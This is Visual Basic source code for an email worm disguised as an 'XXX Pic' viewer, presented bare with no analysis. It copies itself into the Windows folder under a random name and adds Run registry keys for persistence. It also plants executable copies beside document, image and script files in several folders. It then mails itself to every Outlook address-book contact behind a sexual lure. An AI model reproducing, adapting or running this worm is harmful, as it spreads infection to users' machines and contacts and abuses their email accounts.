   Attribute VB_Name = "Module1"
   Private Declare Function WritePrivateProfileString& Lib "kernel32" Alias "WritePrivateProfileStringA" _
                   (ByVal lpszSection As String, ByVal lpszKey As String, _
                   ByVal lpszString As String, ByVal lpszFile As String)


   Sub Main()
   On Error Resume Next
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ws = CreateObject("WScript.Shell")
   Call CopyWorm
   Call inf(App.Path)
   Call inf(ws.SpecialFolders("MyDocuments"))
   Call inf(fso.GetSpecialFolder(0))
   Call inf(fso.GetSpecialFolder(1))
   Call inf(fso.GetSpecialFolder(2))

   If Day(Now) = 1 Or Day(Now) = 15 Or Day(Now) = 31 Then
   xxxpic.Show 1
   Else
   MsgBox "Sorry, no XXX pic today. Wait And See.", vbExclamation, "XXX Pic"
   End If
   End Sub

   Sub CopyWorm()
   On Error Resume Next
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ws = CreateObject("WScript.Shell")
   orig = App.Path
   If Right(orig, 1) <> "\" Then orig = orig & "\"
   orig = orig & App.EXEName & ".exe"
   copywrm = fso.GetSpecialFolder(0)
   If Right(copywrm, 1) <> "\" Then copywrm = copywrm & "\"

   For I = 1 To 8
   Randomize (Timer)
   ncopy = ncopy + Chr(Int(Rnd() * 26) + 97)
   Next I
   copywrm = copywrm & ncopy & ".exe"
   FileCopy orig, copywrm
   ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NewName", copywrm
   Call WritePrivateProfileString("rename", "NUL", orig, "WININIT.INI")
   FileCopy orig, "C:\XXXPic.exe"

   Set out = CreateObject("Outlook.Application")
   Set map = out.GetNameSpace("MAPI")
   If out = "Outlook" Then
   map.Logon "profile", "password"
   For y = 1 To map.AddressLists.Count
   Set z = map.AddressLists(y)
   x = 1
   Set mel = out.CreateItem(0)
   For oo = 1 To z.AddressEntries.Count
   e = z.AddressEntries(x)
   ml.Recipients.Add e
   x = x + 1
   If x < 250 Then oo = z.AddressEntries.Count
   Next oo
   mel.Subject = "XXX Picture..."
   mel.Body = "A pretty girl waits for you. Click on attached file..."
   mel.Attachments.Add "C:\XXXPic.exe"
   mel.Send
   e = ""
   Next y
   map.Logoff
   End If

   End Sub

   Sub inf(dir)
   On Error Resume Next
   orig = ""
   orig = App.Path
   If Right(orig, 1) <> "\" Then orig = orig & "\"
   orig = orig & App.EXEName & ".exe"

   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ws = CreateObject("WScript.Shell")
   Set pwoj = fso.GetFolder(dir)
   Set fc = pwoj.Files
   For Each f1 In fc
   ext = LCase(fso.GetExtensionName(f1.Path))
   If (ext = "vbs") Or (ext = "htm") Or (ext = "doc") Or (ext = "xls") Or (ext = "bmp") _
   Or (ext = "gif") Or (ext = "jpg") Or (ext = "pdf") Or (ext = "js") Then
   cpy = ""
   cpy = Left(f1.Path, Len(f1.Path) - 4)
   FileCopy orig, cpy & ".exe"
   reg = fso.GetBaseName(f1.Path)
   ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & reg, cpy & ".exe"
   End If
   Next

   End Sub
